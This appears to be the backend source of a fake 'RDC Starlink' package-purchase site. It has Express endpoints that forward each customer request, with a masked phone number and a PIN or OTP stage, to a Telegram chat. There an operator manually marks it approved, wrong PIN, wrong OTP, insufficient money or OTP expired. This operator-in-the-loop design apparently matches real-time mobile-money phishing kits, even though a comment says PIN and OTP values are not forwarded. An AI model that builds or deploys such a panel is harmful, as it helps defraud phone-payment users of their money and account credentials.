const express = require("express");
const cors = require("cors");
require("dotenv").config();

const app = express();

app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 3000;

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

const requests = new Map();

let telegramOffset = 0;
let telegramPolling = false;

const allowedStatuses = [
    "approved",
    "wrong_pin",
    "wrong_otp",
    "insufficient_money",
    "otp_expired"
];

function createRequestId() {
    return Date.now() + "-" + Math.random().toString(36).substring(2, 8);
}

async function telegramRequest(method, data) {

    if (!BOT_TOKEN) {
        throw new Error("TELEGRAM_BOT_TOKEN is missing");
    }

    const response = await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/${method}`,
        {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        }
    );

    const result = await response.json();

    if (!result.ok) {
        throw new Error(result.description || "Telegram API error");
    }

    return result;
}

function maskPhone(phone) {

    const digits = String(phone).replace(/\D/g, "");

    if (digits.length < 4) {
        return "****";
    }

    return "*".repeat(digits.length - 4) + digits.slice(-4);
}

function createKeyboard(request) {

    if (request.stage === "pin") {

        return {
            inline_keyboard: [
                [
                    {
                        text: "Approve",
                        callback_data: `status:approved:${request.id}`
                    },
                    {
                        text: "Wrong PIN",
                        callback_data: `status:wrong_pin:${request.id}`
                    }
                ]
            ]
        };
    }

    return {
        inline_keyboard: [
            [
                {
                    text: "Approve",
                    callback_data: `status:approved:${request.id}`
                },
                {
                    text: "Wrong OTP",
                    callback_data: `status:wrong_otp:${request.id}`
                }
            ],
            [
                {
                    text: "Insufficient money",
                    callback_data: `status:insufficient_money:${request.id}`
                },
                {
                    text: "OTP expired",
                    callback_data: `status:otp_expired:${request.id}`
                }
            ]
        ]
    };
}

async function sendTelegramRequest(request) {

    const message =
        "RDC STARLINK\n\n" +
        "Request ID: " + request.id + "\n" +
        "Stage: " + request.stage.toUpperCase() + "\n" +
        "Package: " + request.packageName + "\n" +
        "Validity: " + request.validity + "\n" +
        "Price: " + request.price + "\n" +
        "Phone: " + request.phoneMasked + "\n\n" +
        "Choose an action:";

    await telegramRequest("sendMessage", {

        chat_id: ADMIN_CHAT_ID,

        text: message,

        reply_markup: createKeyboard(request)
    });
}


/* HOME */

app.get("/", (req, res) => {

    res.json({
        status: "online",
        service: "RDC Starlink Telegram backend",
        message: "Backend is running successfully."
    });

});


/* HEALTH CHECK */

app.get("/health", (req, res) => {

    res.json({
        status: "ok",
        telegramConfigured:
            Boolean(BOT_TOKEN && ADMIN_CHAT_ID)
    });

});


/*
CREATE CUSTOMER REQUEST

IMPORTANT:
PIN and OTP values are NOT sent to Telegram.
*/

app.post("/api/requests", async (req, res) => {

    try {

        const {
            packageName,
            validity,
            price,
            phone,
            stage
        } = req.body;

        if (
            !packageName ||
            !validity ||
            price === undefined ||
            !phone
        ) {

            return res.status(400).json({
                error: "Missing required information"
            });

        }

        if (stage !== "pin" && stage !== "otp") {

            return res.status(400).json({
                error: "Invalid request stage"
            });

        }

        const request = {

            id: createRequestId(),

            stage: stage,

            packageName: String(packageName),

            validity: String(validity),

            price: String(price),

            phoneMasked: maskPhone(phone),

            status: "pending",

            createdAt: new Date().toISOString()

        };

        requests.set(request.id, request);

        try {

            await sendTelegramRequest(request);

        } catch (error) {

            requests.delete(request.id);

            console.error(
                "Telegram error:",
                error.message
            );

            return res.status(502).json({

                error: "Telegram notification failed"

            });

        }

        res.status(201).json({

            requestId: request.id,

            status: "pending",

            stage: stage

        });

    } catch (error) {

        console.error(error);

        res.status(500).json({
            error: "Server error"
        });

    }

});


/* CHECK CUSTOMER REQUEST STATUS */

app.get("/api/requests/:id", (req, res) => {

    const request = requests.get(req.params.id);

    if (!request) {

        return res.status(404).json({
            error: "Request not found"
        });

    }

    res.json({

        requestId: request.id,

        status: request.status,

        stage: request.stage

    });

});


/* PROCESS TELEGRAM BUTTON */

async function processTelegramCallback(callback) {

    const data = callback.data || "";

    const parts = data.split(":");

    if (parts.length !== 3) {
        return;
    }

    if (parts[0] !== "status") {
        return;
    }

    const status = parts[1];

    const requestId = parts[2];

    if (!allowedStatuses.includes(status)) {
        return;
    }

    const telegramChatId =
        callback.message &&
        callback.message.chat &&
        callback.message.chat.id;

    if (
        String(telegramChatId) !==
        String(ADMIN_CHAT_ID)
    ) {

        await telegramRequest(
            "answerCallbackQuery",
            {
                callback_query_id: callback.id,
                text: "Not authorized."
            }
        );

        return;
    }

    const request = requests.get(requestId);

    if (!request) {

        await telegramRequest(
            "answerCallbackQuery",
            {
                callback_query_id: callback.id,
                text: "Request not found."
            }
        );

        return;
    }

    request.status = status;

    request.updatedAt =
        new Date().toISOString();

    const names = {

        approved: "Approved",

        wrong_pin: "Wrong PIN",

        wrong_otp: "Wrong OTP",

        insufficient_money:
            "Insufficient money",

        otp_expired:
            "OTP expired"

    };

    await telegramRequest(
        "answerCallbackQuery",
        {
            callback_query_id: callback.id,
            text: names[status]
        }
    );

    try {

        await telegramRequest(
            "editMessageReplyMarkup",
            {

                chat_id: telegramChatId,

                message_id:
                    callback.message.message_id,

                reply_markup: {
                    inline_keyboard: []
                }

            }
        );

    } catch (error) {

        console.log(
            "Could not remove buttons:",
            error.message
        );

    }

    await telegramRequest(
        "sendMessage",
        {

            chat_id: ADMIN_CHAT_ID,

            text:
                "RDC STARLINK\n\n" +
                "Request: " + request.id + "\n" +
                "Decision: " + names[status]

        }
    );
}


/* TELEGRAM POLLING */

async function startTelegramPolling() {

    if (telegramPolling) {
        return;
    }

    if (!BOT_TOKEN || !ADMIN_CHAT_ID) {

        console.log(
            "Telegram environment variables are missing."
        );

        return;
    }

    telegramPolling = true;

    console.log("Telegram polling started.");

    while (true) {

        try {

            const result =
                await telegramRequest(
                    "getUpdates",
                    {
                        offset:
                            telegramOffset,

                        timeout: 25,

                        allowed_updates:
                            ["callback_query"]
                    }
                );

            for (
                const update of result.result || []
            ) {

                telegramOffset =
                    update.update_id + 1;

                if (
                    update.callback_query
                ) {

                    try {

                        await processTelegramCallback(
                            update.callback_query
                        );

                    } catch (error) {

                        console.error(
                            "Callback error:",
                            error.message
                        );

                    }

                }

            }

        } catch (error) {

            console.error(
                "Telegram polling error:",
                error.message
            );

            await new Promise(
                resolve =>
                    setTimeout(resolve, 3000)
            );

        }

    }
}


/* START SERVER */

app.listen(PORT, () => {

    console.log(
        `RDC Starlink backend running on port ${PORT}`
    );

    startTelegramPolling();

});
